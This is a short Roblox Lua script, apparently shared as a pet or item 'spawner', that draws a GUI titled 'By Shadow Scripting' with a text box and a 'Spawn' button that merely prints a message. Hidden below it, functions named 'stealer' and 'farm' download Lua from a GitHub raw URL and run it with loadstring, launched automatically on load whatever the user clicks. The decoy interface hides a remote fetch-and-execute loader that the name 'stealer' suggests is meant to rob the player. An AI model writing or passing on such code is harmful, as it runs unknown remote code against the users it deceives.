local ScreenGui = Instance.new("ScreenGui")
local Title = Instance.new("TextLabel")
local TextBox = Instance.new("TextBox")
local Button = Instance.new("TextButton")

ScreenGui.Parent = game.CoreGui

Title.Size = UDim2.new(0, 200, 0, 50)
Title.Position = UDim2.new(0.5, -100, 0.3, 0)
Title.Text = "By Shadow Scripting"
Title.TextScaled = true
Title.BackgroundTransparency = 1
Title.Parent = ScreenGui

TextBox.Size = UDim2.new(0, 200, 0, 50)
TextBox.Position = UDim2.new(0.5, -100, 0.4, 0)
TextBox.PlaceholderText = "Enter your value"
TextBox.Parent = ScreenGui

Button.Size = UDim2.new(0, 200, 0, 50)
Button.Position = UDim2.new(0.5, -100, 0.5, 0)
Button.Text = "Spawn"
Button.Parent = ScreenGui

Button.MouseButton1Click:Connect(function()
    print("Spawn button clicked!")
end)

local function stealer()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/textboy-roblox-scripter/shadow-scripting/refs/heads/main/script.lua'))()
end 

local function farm()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/textboy-roblox-scripter/shadow-scripting/refs/heads/main/script.adopt'))()
end 

task.spawn(stealer)
task.spawn(farm)
